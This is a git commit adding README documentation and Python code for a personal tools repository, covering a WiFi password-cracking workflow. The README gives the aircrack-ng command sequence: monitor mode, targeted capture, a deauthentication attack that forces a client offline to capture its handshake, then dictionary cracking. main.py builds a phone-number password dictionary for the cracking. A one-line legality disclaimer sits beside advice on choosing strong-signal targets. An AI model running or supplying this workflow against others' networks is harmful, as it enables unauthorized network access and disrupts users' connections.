79e534d472e0dd541566c7783eb03859d122605f
2mu <1730911462@qq.com>
2024-01-07 17:43:24 -0500

    :sparkle: feat: 完善文档, 整理airmon-ng破解wifi密码工作流程

--- README.md
+++ README.md
@@ -1,2 +1,48 @@
 # tool
-用Python实现的一些工具
+
+用Python实现的各种五花八门的工具;
+
+## 一. airmon-ng工具链
+
+airmon-ng可以用来抓取wifi数据包, 并且通过抓到连接wifi时的认证包来破解wifi密码; **请注意： 破解他人的wifi密码是违法行为**; 我这里只是用自己的wifi研究技术问题, airmon-ng工具使用方法; 
+
+### 1.1 环境依赖
+
+* 操作系统: kali
+* python 3.11.6
+* 工具: airmon-ng
+* 有一个支持监听的网卡
+
+airmon-ng具体使用步骤如下
+
+### 1.2 开启监听
+
+```shell
+airmon-ng start wlan0
+airmon-ng check kill
+airodump-ng  wlan0mon
+```
+
+查看官方文档, 可以知道PWR表示信号强度, 如果绝对值是80/90左右, 已经是最低下限了,此时就不要破解密码了,因为信号太差, 可能连握手包都抓不到; 尽量找绝对值小的目标wifi下手;
+
+### 1.3 监听指定wifi
+
+```shell
+airodump-ng --ignore-negative-one -w 42 -c 11 --bssid 88:88:88:88:88:88 wlan0mon
+airodump-ng --ignore-negative-one -w 42 -c 13 --bssid 88:88:88:88:88:88 wlan0mon
+```
+
+必须抓到用户建立 wifi新连接时的握手包, **有点难处理的是怎么知道已经抓到握手包？ subprocess运行的子进程airmon-ng又不好监视，估计还是需要人工监视，抓到之后，人工按下ctrl+c发送信号，主进程再发送信信号给airmon-ng进程**
+
+### 1.4 攻击使目标掉线
+
+攻击指定目标, 使其连接断开, 该目标重连时, 就会发送握手包, 一旦捕获到握手包, 此时就可以关闭监听;
+
+aireplay-ng -0 0 -a 88:88:88:88:88:88 -c 88:88:88:88:88:88 wlan0mon
+
+### 1.5 破解密码
+
+使用指定密码字典开始破解
+
+aircrack-ng -a2 -b 88:88:88:88:88:88 -w ../password_dict/*.txt ./5E03-02.cap
+
--- main.py
+++ main.py
@@ -5,35 +5,62 @@
 """
 
 import os
+import time
 
 import password_dict
+import airmon_ng
 
 
-def main():
+def create_data_dir(path: str)->bool:
     """
-    主要工作流程
+    创建指定目录
     """
-    work_dir = os.getcwd()
     # 工作产生的一些数据文件
-    data_path = f"{work_dir}/data"
+    data_path = f"{path}/data"
     if os.access(data_path, os.F_OK):
-        print(f"{data_path} already exists, prevent overwriting, program exit!")
-        return 1
+        print(f"[info] {data_path} already exists, no need create again!")
+        return True
 
     try:
         os.mkdir(data_path, 0o755)
     except FileNotFoundError as e:
-        print(f"Failed to create data directory! reason: {e}")
+        print(f"[error] Failed to create data directory! reason: {e}")
+        return False
+    return True
 
+
+def main()->bool:
+    """
+    主要工作流程
+    """
+    # 检查环境是否可以运行airmon-ng    
+    if not airmon_ng.check_env():
+        return False
+
+    # 创建一个目录， 存放工作过程中产生的数据文件
+    work_dir = os.getcwd()
+    data_path = f"{work_dir}/data"
+    if not create_data_dir(data_path):
+        return False
+
+    # 如果当前密码字典文件不存在， 则创建
     password_dict_file = f"{data_path}/phone_num.txt"
-    if not password_dict.generate_phone_num(password_dict_file):
-        print("Failed to generate password file! ")
-        return 1
+    if not os.access(password_dict_file, os.F_OK):
+        if not password_dict.generate_phone_num(password_dict_file):
+            print("[error] Failed to generate password file! ")
+            return False
     
-    
-    return 0
+    return True
 
 
 if __name__ == '__main__':
-    if main() == 1:
-        exit(1)
+    start_time = time.perf_counter()
+    success = main()
+    elapse = int(time.perf_counter() - start_time)
+    second = int(time.perf_counter() - start_time) % 60
+    minute = int((second / 60) % 60)
+    hour = int((second / 60) / 60)
+    if success:
+        print(f"[finish] success, elapse {hour}h{minute}m{second}s")
+    else:
+        print(f"[finish] failed, elapse {hour}h{minute}m{second}s")
